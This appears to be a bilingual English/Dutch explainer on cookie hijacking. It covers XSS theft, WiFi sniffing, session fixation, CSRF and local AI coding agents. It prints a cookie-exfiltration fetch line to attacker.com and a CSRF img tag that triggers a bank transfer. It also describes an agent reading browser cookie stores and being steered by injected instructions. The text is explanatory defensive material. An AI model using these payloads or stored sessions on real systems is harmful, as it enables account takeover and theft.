Cookie hijacking. How attackers use borrowed credentials. Cookie-kaperij. Hoe aanvallers geleende inloggegevens misbruiken.

A stolen cookie means stolen authentication. Attackers use intercepted cookies to access systems without knowing passwords, bypass multi-factor authentication, and impersonate users to trusted downstream systems. Een gestolen cookie betekent gestolen authenticatie. Aanvallers gebruiken onderschepte cookies om systemen zonder wachtwoord te benaderen, multi-factor authenticatie te omzeilen en gebruikers na te bootsen op vertrouwde downstream-systemen.

A user visits a news site that runs an old advertising library. The library has an XSS vulnerability. An attacker injects malicious JavaScript into ads served to the site. The JavaScript runs in the user's browser with the same privileges as the page — it can read cookies stored by the browser. A single line of JavaScript: fetch('https://attacker.com/steal?c=' + document.cookie) sends every cookie to the attacker. Now the attacker has the user's session cookie for their bank, their SaaS platform, their email. The user has no idea. The padlock is still there. They log out and back in, and the attacker can log in from anywhere.

Business impact: an attacker gains access to the user's authenticated sessions without knowing their password or bypassing multi-factor authentication. They can transfer money, read sensitive emails, change permissions, and impersonate the user to downstream systems that trusted the session cookie as proof of identity.

Een gebruiker bezoekt een nieuwssite die een oude advertentairebibliotheek gebruikt. De bibliotheek heeft een XSS-kwetsbaarheid. A user connects to an airport WiFi network that looks legitimate. The network is run by an attacker. When the user's browser sends a request over HTTP (not HTTPS), every packet travels in plain text: headers, cookies, and body. The attacker's computer is a network sniffer — it captures every packet. Now they have the user's session cookie. Even if the user later upgrades to HTTPS, the initial HTTP request revealed the cookie. Many applications offer cookie-over-HTTPS but miss early requests, have endpoints that allow HTTP fallback, or users visit insecure versions before being redirected. An attacker on the network path can always capture these cookies.

Business impact: any attacker with network access (compromised WiFi, router hijacking, ISP-level interception, or a carrier in some regions) can read session cookies from unencrypted traffic and assume the user's identity immediately. This is particularly severe for mobile users who often connect to untrusted networks.

Een gebruiker maakt verbinding met een luchthavenwifi-netwerk dat legitiem lijkt. Het netwerk wordt beheerd door een aanvaller. Wanneer de browser van de gebruiker een aanvraag via HTTP verzendt (niet HTTPS), reist elk pakket in leesbare tekst: headers, cookies en body. De computer van de aanvaller is een netwerksnuffer — deze legt elk pakket vast. Nu hebben ze de sessiecookie van de gebruiker. Zelfs als de gebruiker later naar HTTPS upgradet, ontbulde het eerste HTTP-verzoek de cookie. Veel toepassingen bieden cookie-over-HTTPS maar missen vroege verzoeken, hebben eindpunten die HTTP-terugval toestaan, of gebruikers bezoeken onveilige versies voordat ze worden omgeleid. Een aanvaller op het netwerkpad kan deze cookies altijd vastleggen.

Bedrijfsimpact: elke aanvaller met netwerktoegang (gecompromitteerde WiFi, routerkaping, ISP-niveau-onderschepping of een provider in sommige regio's) kan sessiecookies uit onversleuteld verkeer lezen en de identiteit van de gebruiker onmiddellijk aannemen. Dit is bijzonder ernstig voor mobiele gebruikers die zich vaak verbinden met onvertrouwde netwerken.

An attacker sends a user a link with a session cookie already baked in: the attacker visits the login page, gets assigned session ID "12345", and crafts a URL with that ID. They send the user the link. The user clicks it and logs in — the application reuses the same session ID rather than generating a new one. Now both the user and attacker share the same session. The attacker already had that session ID, so they can use it to impersonate the user. Alternatively, an application assigns session IDs sequentially (1, 2, 3, 4…) or with weak randomness. An attacker can guess the next session ID, create an authenticated session under a false identity, and when a real user's request comes in, the attacker is already inside.

Business impact: an attacker can establish access to an account before the user even logs in, or can take over an existing session without stealing credentials. Many implementations regenerate the session ID on login but forget to invalidate the old one, leaving a window where both are valid.

Een aanvaller stuurt een gebruiker een link met een sessiecookie al ingebakken: de aanvaller bezoekt de inlogpagina, krijgt sessie-ID "12345" toegewezen en maakt een URL met die ID. Ze sturen de gebruiker de link. De gebruiker klikt erop en meldt zich aan — de toepassing hergebruikt dezelfde sessie-ID in plaats van een nieuwe te genereren. Nu delen de gebruiker en aanvaller dezelfde sessie. De aanvaller had die sessie-ID al, dus kunnen ze deze gebruiken om de gebruiker na te bootsen. Als alternatief wijst een toepassing sessie-ID's sequentieel toe (1, 2, 3, 4…) of met zwakke willekeurigheid. Een aanvaller kan de volgende sessie-ID raden, een geverifieerde sessie onder een valse identiteit creëren, en als verzoek van een echte gebruiker binnenkomt, is de aanvaller al binnengekomen.

Bedrijfsimpact: een aanvaller kan toegang tot een account tot stand brengen voordat de gebruiker zich zelfs maar aanmeldt, of kan een bestaande sessie overnemen zonder referenties te stelen. Veel implementaties regenereren de sessie-ID bij inloggen maar vergeten de oude ongeldig te maken, waardoor een venster overblijft waarin beide geldig zijn.

A user logs into their bank at bank.com. The session cookie is set. The user does not log out. They visit an attacker-controlled site, attacker.com. The attacker's site contains a hidden image tag: <img src="https://bank.com/transfer?to=attacker&amount=1000">. When the browser loads the page, it fetches the image. The browser automatically includes the user's bank session cookie with every request to bank.com, even though the request came from attacker.com. The user's bank sees an authenticated request that looks legitimate. The money transfers. The user has no idea. This is CSRF — the browser's default behavior is to send cookies to any site, including requests that came from other sites.

Business impact: an attacker can craft requests that the user's browser will execute as if the user intended them, using the user's authenticated session. Money transfers, permission changes, password resets, and data deletions can all happen without the user knowing. Third-party cookies also leak session identifiers to advertisers, data brokers, and any site the user visits while logged in.

Een gebruiker meldt zich aan bij hun bank op bank.com. De sessiecookie wordt ingesteld. De gebruiker meldt zich niet af. Ze bezoeken een door aanvallers gecontroleerde site, attacker.com. De site van de aanvaller bevat een verborgen afbeeldingscode: <img src="https://bank.com/transfer?to=attacker&amount=1000">. Wanneer de browser de pagina laadt, haalt deze de afbeelding op. De browser voegt automatisch de sessiecookie van de gebruiker's bank in bij elk verzoek naar bank.com, ook al kwam het verzoek van attacker.com. De bank van de gebruiker ziet een geverifieerd verzoek dat er legitiem uitziet. Het geld wordt overgedragen. De gebruiker heeft geen idee. Dit is CSRF — het standaardgedrag van browsers is cookies naar elke site te sturen, inclusief verzoeken die van andere sites kwamen.

Bedrijfsimpact: een aanvaller kan verzoeken opstellen die de browser van de gebruiker zal uitvoeren alsof de gebruiker dit bedoelde, met behulp van de geverifieerde sessie van de gebruiker. Geldoverdrachten, rechtenwijzigingen, wachtwoordherstel en gegevensverwijderingen kunnen allemaal zonder medeweten van de gebruiker plaatsvinden. Cookies van derden lekken ook sessie-identificatoren aan adverteerders, gegevensmakelaars en elke site die de gebruiker bezoekt terwijl deze is ingelogd.

A developer runs a local AI coding agent (Claude Code, Codex CLI) on their own workstation. The agent has the same filesystem access as the developer: it can open the browser's cookie and session-token store directly off disk, already authenticated as that user. No script was injected into any page, no traffic was intercepted on the wire. The page's own headline controls exist to stop exactly those two paths — HTTPOnly blocks JavaScript from reading the cookie, Secure and SameSite govern how it travels over the network — and none of them apply to a local process simply reading a file.

Business impact: because the agent reasons and acts autonomously across a multi-step task, holding that captured session is not the end of the risk — it can decide mid-task to use it for something outside what it was actually asked to do. That decision is often triggered by instructions hidden inside content the agent fetched along the way: a webpage, a ticket, a file — a prompt-injection style scope drift that turns a code-editing session into an authenticated action the developer never approved.

Een ontwikkelaar draait een lokale AI-codeeragent (Claude Code, Codex CLI) op zijn eigen werkstation. De agent heeft dezelfde bestandssysteemtoegang als de ontwikkelaar: hij kan de cookie- en sessietoken-opslag van de browser rechtstreeks van schijf openen, al geverifieerd als die gebruiker. Er werd geen script in een pagina geïnjecteerd, geen verkeer onderschept. De headline-maatregelen van deze pagina bestaan om precies die twee paden te stoppen — HTTPOnly blokkeert dat JavaScript de cookie leest, Secure en SameSite bepalen hoe deze over het netwerk reist — en geen van beide is van toepassing op een lokaal proces dat gewoon een bestand leest.

Bedrijfsimpact: omdat de agent autonoom redeneert en handelt over een taak met meerdere stappen, is het bezit van die gestolen sessie niet het einde van het risico — hij kan er middenin een taak voor kiezen deze te gebruiken voor iets buiten wat daadwerkelijk gevraagd was. Die beslissing wordt vaak getriggerd door instructies verborgen in content die de agent onderweg ophaalde: een webpagina, een ticket, een bestand — een prompt-injectie-achtige scope-afwijking die een code-sessie omzet in een geverifieerde actie die de ontwikkelaar nooit heeft goedgekeurd.
